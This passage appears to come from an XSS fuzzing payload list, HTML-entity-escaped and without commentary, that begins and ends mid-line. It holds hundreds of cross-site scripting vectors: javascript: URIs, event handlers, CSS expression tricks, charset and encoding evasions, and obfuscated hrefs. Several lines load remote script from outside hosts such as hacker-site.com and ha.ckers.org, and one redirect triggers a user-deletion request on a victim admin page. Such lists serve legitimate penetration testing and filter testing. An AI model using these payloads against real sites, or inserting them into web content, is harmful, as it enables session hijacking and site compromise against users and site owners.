u0030\\u004b\\u0044\\u0059\\u0070\\u0049\\u0069\\u0041\\u0076\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0043\\u0041\\u0067\\u0049\\u0043\\u0041\\u0038\\u0064\\u0047\\u0056\\u0034\\u0064\\u0043\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\u0030\\u004b\\u0044\\u0063\\u0070\\u0049\\u006a\\u0034\\u0038\\u004c\\u0033\\u0052\\u006c\\u0065\\u0048\\u0051\\u002b\\u0049\\u0043\\u0041\\u004b\\u0049\\u0043\\u0041\\u0067\\u0050\\u0043\\u0039\\u006e\\u0050\\u0069\\u0041\\u0067\\u0043\\u006a\\u0077\\u0076\\u0063\\u0033\\u005a\\u006e\\u0050\\u0069\\u0041\\u0067\\u0022\\u003e\\u003c\\u002f\\u0069\\u0066\\u0072\\u0061\\u006d\\u0065\\u003e');\"&gt;&lt;/img&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;SCRIPT SRC=http://hacker-site.com/xss.js&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT&gt; alert(\u201cXSS\u201d); &lt;/SCRIPT&gt;\n&lt;BODY ONLOAD=alert(\"XSS\")&gt;\n&lt;BODY BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG DYNSRC=\"javascript:alert('XSS')\"&gt;\n&lt;IMG LOWSRC=\"javascript:alert('XSS')\"&gt;\n&lt;IFRAME SRC=\u201dhttp://hacker-site.com/xss.html\u201d&gt;\n&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\"&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\"&gt;\n&lt;TABLE BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;TD BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;DIV STYLE=\"background-image: url(javascript:alert('XSS'))\"&gt;\n&lt;DIV STYLE=\"width: expression(alert('XSS'));\"&gt;\n&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://hacker.com/xss.html\"&gt;\n&lt;EMBED SRC=\"http://hacker.com/xss.swf\" AllowScriptAccess=\"always\"&gt;\n&amp;apos;;alert(String.fromCharCode(88,83,83))//\\&amp;apos;;alert(String.fromCharCode(88,83,83))//&amp;quot;;alert(String.fromCharCode(88,83,83))//\\&amp;quot;;alert(String.fromCharCode(88,83,83))//--&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;gt;&amp;apos;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;\n&amp;apos;&amp;apos;;!--&amp;quot;&amp;lt;XSS&amp;gt;=&amp;amp;{()}\n&amp;lt;SCRIPT&amp;gt;alert(&amp;apos;XSS&amp;apos;)&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT SRC=http://ha.ckers.org/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;BASE HREF=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);//&amp;quot;&amp;gt;\n&amp;lt;BGSOUND SRC=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;BODY BACKGROUND=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;BODY ONLOAD=alert(&amp;apos;XSS&amp;apos;)&amp;gt;\n&amp;lt;DIV STYLE=&amp;quot;background-image: url(javascript:alert(&amp;apos;XSS&amp;apos;))&amp;quot;&amp;gt;\n&amp;lt;DIV STYLE=&amp;quot;background-image: url(&amp;amp;#1;javascript:alert(&amp;apos;XSS&amp;apos;))&amp;quot;&amp;gt;\n&amp;lt;DIV STYLE=&amp;quot;width: expression(alert(&amp;apos;XSS&amp;apos;));&amp;quot;&amp;gt;\n&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME SRC=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;&amp;lt;/FRAMESET&amp;gt;\n&amp;lt;IFRAME SRC=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;\n&amp;lt;INPUT TYPE=&amp;quot;IMAGE&amp;quot; SRC=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=javascript:alert(&amp;apos;XSS&amp;apos;)&amp;gt;\n&amp;lt;IMG DYNSRC=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG LOWSRC=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&amp;quot;&amp;gt;\nRedirect 302 /a.jpg http://victimsite.com/admin.asp&amp;amp;deleteuser\nexp/*&amp;lt;XSS STYLE=&amp;apos;no\\xss:noxss(&amp;quot;*//*&amp;quot;);\n&amp;lt;STYLE&amp;gt;li {list-style-image: url(&amp;quot;javascript:alert(&amp;#39;XSS&amp;#39;)&amp;quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;UL&amp;gt;&amp;lt;LI&amp;gt;XSS\n&amp;lt;IMG SRC=&amp;apos;vbscript:msgbox(&amp;quot;XSS&amp;quot;)&amp;apos;&amp;gt;\n&amp;lt;LAYER SRC=&amp;quot;http://ha.ckers.org/scriptlet.html&amp;quot;&amp;gt;&amp;lt;/LAYER&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;livescript:[code]&amp;quot;&amp;gt;\n%BCscript%BEalert(%A2XSS%A2)%BC/script%BE\n&amp;lt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;0;url=javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&amp;quot;&amp;gt;\n&amp;lt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;0; URL=http://;URL=javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;mocha:[code]&amp;quot;&amp;gt;\n&amp;lt;OBJECT TYPE=&amp;quot;text/x-scriptlet&amp;quot; DATA=&amp;quot;http://ha.ckers.org/scriptlet.html&amp;quot;&amp;gt;&amp;lt;/OBJECT&amp;gt;\n&amp;lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&amp;gt;&amp;lt;param name=url value=javascript:alert(&amp;apos;XSS&amp;apos;)&amp;gt;&amp;lt;/OBJECT&amp;gt;\n&amp;lt;EMBED SRC=&amp;quot;http://ha.ckers.org/xss.swf&amp;quot; AllowScriptAccess=&amp;quot;always&amp;quot;&amp;gt;&amp;lt;/EMBED&amp;gt;\na=&amp;quot;get&amp;quot;;&amp;amp;#10;b=&amp;quot;URL(&amp;quot;&amp;quot;;&amp;amp;#10;c=&amp;quot;javascript:&amp;quot;;&amp;amp;#10;d=&amp;quot;alert(&amp;apos;XSS&amp;apos;);&amp;quot;)&amp;quot;;&amp;#10;eval(a+b+c+d);\n&amp;lt;STYLE TYPE=&amp;quot;text/javascript&amp;quot;&amp;gt;alert(&amp;apos;XSS&amp;apos;);&amp;lt;/STYLE&amp;gt;\n&amp;lt;IMG STYLE=&amp;quot;xss:expr/*XSS*/ession(alert(&amp;apos;XSS&amp;apos;))&amp;quot;&amp;gt;\n&amp;lt;XSS STYLE=&amp;quot;xss:expression(alert(&amp;apos;XSS&amp;apos;))&amp;quot;&amp;gt;\n&amp;lt;STYLE&amp;gt;.XSS{background-image:url(&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;)&amp;quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;A CLASS=XSS&amp;gt;&amp;lt;/A&amp;gt;\n&amp;lt;STYLE type=&amp;quot;text/css&amp;quot;&amp;gt;BODY{background:url(&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;)&amp;quot;)}&amp;lt;/STYLE&amp;gt;\n&amp;lt;LINK REL=&amp;quot;stylesheet&amp;quot; HREF=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;LINK REL=&amp;quot;stylesheet&amp;quot; HREF=&amp;quot;http://ha.ckers.org/xss.css&amp;quot;&amp;gt;\n&amp;lt;STYLE&amp;gt;@import&amp;apos;http://ha.ckers.org/xss.css&amp;apos;;&amp;lt;/STYLE&amp;gt;\n&amp;lt;META HTTP-EQUIV=&amp;quot;Link&amp;quot; Content=&amp;quot;&amp;lt;http://ha.ckers.org/xss.css&amp;gt;; REL=stylesheet&amp;quot;&amp;gt;\n&amp;lt;STYLE&amp;gt;BODY{-moz-binding:url(&amp;quot;http://ha.ckers.org/xssmoz.xml#xss&amp;quot;)}&amp;lt;/STYLE&amp;gt;\n&amp;lt;TABLE BACKGROUND=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;)&amp;quot;&amp;gt;&amp;lt;/TABLE&amp;gt;\n&amp;lt;TABLE&amp;gt;&amp;lt;TD BACKGROUND=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;)&amp;quot;&amp;gt;&amp;lt;/TD&amp;gt;&amp;lt;/TABLE&amp;gt;\n&amp;lt;HTML xmlns:xss&amp;gt;\n&amp;lt;XML ID=I&amp;gt;&amp;lt;X&amp;gt;&amp;lt;C&amp;gt;&amp;lt;![CDATA[&amp;lt;IMG SRC=&amp;quot;javas]]&amp;gt;&amp;lt;![CDATA[cript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;]]&amp;gt;\n&amp;lt;XML ID=&amp;quot;xss&amp;quot;&amp;gt;&amp;lt;I&amp;gt;&amp;lt;B&amp;gt;&amp;lt;IMG SRC=&amp;quot;javas&amp;lt;!-- --&amp;gt;cript:alert(&amp;apos;XSS&amp;apos;)&amp;quot;&amp;gt;&amp;lt;/B&amp;gt;&amp;lt;/I&amp;gt;&amp;lt;/XML&amp;gt;\n&amp;lt;XML SRC=&amp;quot;http://ha.ckers.org/xsstest.xml&amp;quot; ID=I&amp;gt;&amp;lt;/XML&amp;gt;\n&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;\n&amp;lt;!--[if gte IE 4]&amp;gt;               \n&amp;lt;META HTTP-EQUIV=&amp;quot;Set-Cookie&amp;quot; Content=&amp;quot;USERID=&amp;lt;SCRIPT&amp;gt;alert(&amp;apos;XSS&amp;apos;)&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;gt;\n&amp;lt;XSS STYLE=&amp;quot;behavior: url(http://ha.ckers.org/xss.htc);&amp;quot;&amp;gt;\n&amp;lt;SCRIPT SRC=&amp;quot;http://ha.ckers.org/xss.jpg&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;!--#exec cmd=&amp;quot;/bin/echo &amp;apos;&amp;lt;SCRIPT SRC&amp;apos;&amp;quot;--&amp;gt;&amp;lt;!--#exec cmd=&amp;quot;/bin/echo &amp;apos;=http://ha.ckers.org/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;apos;&amp;quot;--&amp;gt;\n&amp;lt;? echo(&amp;apos;&amp;lt;SCR)&amp;apos;;\n&amp;lt;BR SIZE=&amp;quot;&amp;amp;{alert(&amp;apos;XSS&amp;apos;)}&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=JaVaScRiPt:alert(&amp;apos;XSS&amp;apos;)&amp;gt;\n&amp;lt;IMG SRC=javascript:alert(&amp;amp;quot;XSS&amp;amp;quot;)&amp;gt;\n&amp;lt;IMG SRC=`javascript:alert(&amp;quot;RSnake says, &amp;apos;XSS&amp;apos;&amp;quot;)`&amp;gt;\n&amp;lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&amp;gt;\n&amp;lt;IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;\n&amp;lt;IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041&amp;gt;\n&amp;lt;DIV STYLE=&amp;quot;background-image:\\0075\\0072\\006C\\0028&amp;apos;\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029&amp;apos;\\0029&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;\n&amp;lt;HEAD&amp;gt;&amp;lt;META HTTP-EQUIV=&amp;quot;CONTENT-TYPE&amp;quot; CONTENT=&amp;quot;text/html; charset=UTF-7&amp;quot;&amp;gt; &amp;lt;/HEAD&amp;gt;+ADw-SCRIPT+AD4-alert(&amp;apos;XSS&amp;apos;);+ADw-/SCRIPT+AD4-\n\\&amp;quot;;alert(&amp;apos;XSS&amp;apos;);//\n&amp;lt;/TITLE&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(\"XSS\");&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;STYLE&amp;gt;@im\\port&amp;apos;\\ja\\vasc\\ript:alert(&amp;quot;XSS&amp;quot;)&amp;apos;;&amp;lt;/STYLE&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;jav&amp;#x09;ascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;jav&amp;amp;#x09;ascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;jav&amp;amp;#x0A;ascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;jav&amp;amp;#x0D;ascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;IMG&amp;#x0D;SRC&amp;#x0D;=&amp;#x0D;&amp;quot;&amp;#x0D;j&amp;#x0D;a&amp;#x0D;v&amp;#x0D;a&amp;#x0D;s&amp;#x0D;c&amp;#x0D;r&amp;#x0D;i&amp;#x0D;p&amp;#x0D;t&amp;#x0D;:&amp;#x0D;a&amp;#x0D;l&amp;#x0D;e&amp;#x0D;r&amp;#x0D;t&amp;#x0D;(&amp;#x0D;&amp;apos;&amp;#x0D;X&amp;#x0D;S&amp;#x0D;S&amp;#x0D;&amp;apos;&amp;#x0D;)&amp;#x0D;&amp;quot;&amp;#x0D;&amp;gt;&amp;#x0D;\nperl -e &amp;apos;print &amp;quot;&amp;lt;IMG SRC=java\\0script:alert(&amp;quot;XSS&amp;quot;)&gt;&amp;quot;;&amp;apos;&amp;gt; out\nperl -e &amp;apos;print &amp;quot;&amp;amp;&amp;lt;SCR\\0IPT&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCR\\0IPT&amp;gt;&amp;quot;;&amp;apos; &amp;gt; out\n&amp;lt;IMG SRC=&amp;quot; &amp;amp;#14;  javascript:alert(&amp;apos;XSS&amp;apos;);&amp;quot;&amp;gt;\n&amp;lt;SCRIPT/XSS SRC=&amp;quot;http://ha.ckers.org/xss.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\\]^`=alert(&amp;quot;XSS&amp;quot;)&amp;gt;\n&amp;lt;SCRIPT SRC=http://ha.ckers.org/xss.js\n&amp;lt;SCRIPT SRC=//ha.ckers.org/.j&amp;gt;\n&amp;lt;IMG SRC=&amp;quot;javascript:alert(&amp;apos;XSS&amp;apos;)&amp;quot;\n&amp;lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &amp;lt;\n&amp;lt;&amp;lt;SCRIPT&amp;gt;alert(&amp;quot;XSS&amp;quot;);//&amp;lt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;IMG &amp;quot;&amp;quot;&amp;quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;gt;\n&amp;lt;SCRIPT&amp;gt;a=/XSS/\n&amp;lt;SCRIPT a=&amp;quot;&amp;gt;&amp;quot; SRC=&amp;quot;http://ha.ckers.org/xss.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT =&amp;quot;blah&amp;quot; SRC=&amp;quot;http://ha.ckers.org/xss.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT a=&amp;quot;blah&amp;quot; &amp;apos;&amp;apos; SRC=&amp;quot;http://ha.ckers.org/xss.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT &amp;quot;a=&amp;apos;&amp;gt;&amp;apos;&amp;quot; SRC=&amp;quot;http://ha.ckers.org/xss.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT a=`&amp;gt;` SRC=&amp;quot;http://ha.ckers.org/xss.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT&amp;gt;document.write(&amp;quot;&amp;lt;SCRI&amp;quot;);&amp;lt;/SCRIPT&amp;gt;PT SRC=&amp;quot;http://ha.ckers.org/xss.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT a=&amp;quot;&gt;&amp;apos;&gt;&amp;quot; SRC=&amp;quot;http://ha.ckers.org/xss.js&amp;quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://66.102.7.147/&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://1113982867/&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://0x42.0x0000066.0x7.0x93/&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://0102.0146.0007.00000223/&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;h&amp;#x0A;tt&amp;#09;p://6&amp;amp;#09;6.000146.0x7.147/&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;//www.google.com/&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;//google&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://ha.ckers.org@google&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://google:ha.ckers.org&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://google.com/&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://www.google.com./&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;javascript:document.location=&amp;apos;http://www.google.com/&amp;apos;&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=&amp;quot;http://www.gohttp://www.google.com/ogle.com/&amp;quot;&amp;gt;XSS&amp;lt;/A&amp;gt;\n&lt;script&gt;document.vulnerable=true;&lt;/script&gt;\n&lt;img SRC=\"jav ascript:document.vulnerable=true;\"&gt;\n&lt;img SRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;img SRC=\" &amp;#14; javascript:document.vulnerable=true;\"&gt;\n&lt;body onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=document.vulnerable=true;&gt;\n&lt;&lt;SCRIPT&gt;document.vulnerable=true;//&lt;&lt;/SCRIPT&gt;\n&lt;script &lt;B&gt;document.vulnerable=true;&lt;/script&gt;\n&lt;img SRC=\"javascript:document.vulnerable=true;\"\n&lt;iframe src=\"javascript:document.vulnerable=true; &lt;\n&lt;script&gt;a=/XSS/\\ndocument.vulnerable=true;&lt;/script&gt;\n\\\";document.vulnerable=true;;//\n&lt;/title&gt;&lt;SCRIPT&gt;document.vulnerable=true;&lt;/script&gt;\n&lt;input TYPE=\"IMAGE\" SRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;body BACKGROUND=\"javascript:document.vulnerable=true;\"&gt;\n&lt;body ONLOAD=document.vulnerable=true;&gt;\n&lt;img DYNSRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;img LOWSRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;bgsound SRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;br SIZE=\"&amp;{document.vulnerable=true}\"&gt;\n&lt;LAYER SRC=\"javascript:document.vulnerable=true;\"&gt;&lt;/LAYER&gt;\n&lt;link REL=\"stylesheet\" HREF=\"javascript:document.vulnerable=true;\"&gt;\n&lt;style&gt;li {list-style-image: url(\"javascript:document.vulnerable=true;\");&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS\n&lt;img SRC='vbscript:document.vulnerable=true;'&gt;\n1script3document.vulnerable=true;1/script3\n&lt;meta HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:document.vulnerable=true;\"&gt;\n&lt;meta HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:document.vulnerable=true;\"&gt;\n&lt;IFRAME SRC=\"javascript:document.vulnerable=true;\"&gt;&lt;/iframe&gt;\n&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:document.vulnerable=true;\"&gt;&lt;/frameset&gt;\n&lt;table BACKGROUND=\"javascript:document.vulnerable=true;\"&gt;\n&lt;table&gt;&lt;TD BACKGROUND=\"javascript:document.vulnerable=true;\"&gt;\n&lt;div STYLE=\"background-image: url(javascript:document.vulnerable=true;)\"&gt;\n&lt;div STYLE=\"background-image: url(&amp;#1;javascript:document.vulnerable=true;)\"&gt;\n&lt;div STYLE=\"width: expression(document.vulnerable=true);\"&gt;\n&lt;style&gt;@im\\port'\\ja\\vasc\\ript:document.vulnerable=true';&lt;/style&gt;\n&lt;img STYLE=\"xss:expr/*XSS*/ession(document.vulnerable=true)\"&gt;\n&lt;XSS STYLE=\"xss:expression(document.vulnerable=true)\"&gt;\nexp/*&lt;A STYLE='no\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'&gt;\n&lt;style TYPE=\"text/javascript\"&gt;document.vulnerable=true;&lt;/style&gt;\n&lt;style&gt;.XSS{background-image:url(\"javascript:document.vulnerable=true\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/a&gt;\n&lt;style type=\"text/css\"&gt;BODY{background:url(\"javascript:document.vulnerable=true\")}&lt;/style&gt;\n&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;document.vulnerable=true;&lt;/SCRIPT&gt;&lt;![endif]--&gt;\n&lt;base HREF=\"javascript:document.vulnerable=true;//\"&gt;\n&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:document.vulnerable=true&gt;&lt;/object&gt;\n&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![&lt;IMG SRC=\"javas]]&lt;![cript:document.vulnerable=true;\"&gt;]]&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/span&gt;\n&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript:document.vulnerable=true\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/span&gt;\n&lt;html&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"&gt;&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;&lt;t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;document.vulnerable=true&lt;/SCRIPT&gt;\"&gt;&lt;/BODY&gt;&lt;/html&gt;\n&lt;? echo('&lt;SCR)';echo('IPT&gt;document.vulnerable=true&lt;/SCRIPT&gt;'); ?&gt;\n&lt;meta HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;document.vulnerable=true&lt;/SCRIPT&gt;\"&gt;\n&lt;head&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-\n&lt;a href=\"javascript#document.vulnerable=true;\"&gt;\n&lt;div onmouseover=\"document.vulnerable=true;\"&gt;\n&lt;img src=\"javascript:document.vulnerable=true;\"&gt;\n&lt;img dynsrc=\"javascript:document.vulnerable=true;\"&gt;\n&lt;input type=\"image\" dynsrc=\"javascript:document.vulnerable=true;\"&gt;\n&lt;bgsound src=\"javascript:document.vulnerable=true;\"&gt;\n&amp;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;\n&amp;{document.vulnerable=true;};\n&lt;img src=&amp;{document.vulnerable=true;};&gt;\n&lt;link rel=\"stylesheet\" href=\"javascript:document.vulnerable=true;\"&gt;\n&lt;iframe src=\"vbscript:document.vulnerable=true;\"&gt;\n&lt;img src=\"mocha:document.vulnerable=true;\"&gt;\n&lt;img src=\"livescript:document.vulnerable=true;\"&gt;\n&lt;a href=\"about:&lt;script&gt;document.vulnerable=true;&lt;/script&gt;\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0;url=javascript:document.vulnerable=true;\"&gt;\n&lt;body onload=\"document.vulnerable=true;\"&gt;\n&lt;div style=\"background-image: url(javascript:document.vulnerable=true;);\"&gt;\n&lt;div style=\"behaviour: url([link to code]);\"&gt;\n&lt;div style=\"binding: url([link to code]);\"&gt;\n&lt;div style=\"width: expression(document.vulnerable=true;);\"&gt;\n&lt;style type=\"text/javascript\"&gt;document.vulnerable=true;&lt;/style&gt;\n&lt;object classid=\"clsid:...\" codebase=\"javascript:document.vulnerable=true;\"&gt;\n&lt;style&gt;&lt;!--&lt;/style&gt;&lt;script&gt;document.vulnerable=true;//--&gt;&lt;/script&gt;\n&lt;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;\n&lt;![&lt;!--]]&lt;script&gt;document.vulnerable=true;//--&gt;&lt;/script&gt;\n&lt;!-- -- --&gt;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;&lt;!-- -- --&gt;\n&lt;img src=\"blah\"onmouseover=\"document.vulnerable=true;\"&gt;\n&lt;img src=\"blah&gt;\" onmouseover=\"document.vulnerable=true;\"&gt;\n&lt;xml src=\"javascript:document.vulnerable=true;\"&gt;\n&lt;xml id=\"X\"&gt;&lt;a&gt;&lt;b&gt;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;;&lt;/b&gt;&lt;/a&gt;&lt;/xml&gt;\n&lt;div datafld=\"b\" dataformatas=\"html\" datasrc=\"#X\"&gt;&lt;/div&gt;\n[\\xC0][\\xBC]script&gt;document.vulnerable=true;[\\xC0][\\xBC]/script&gt;\n&lt;style&gt;@import'http://www.securitycompass.com/xss.css';&lt;/style&gt;\n&lt;meta HTTP-EQUIV=\"Link\" 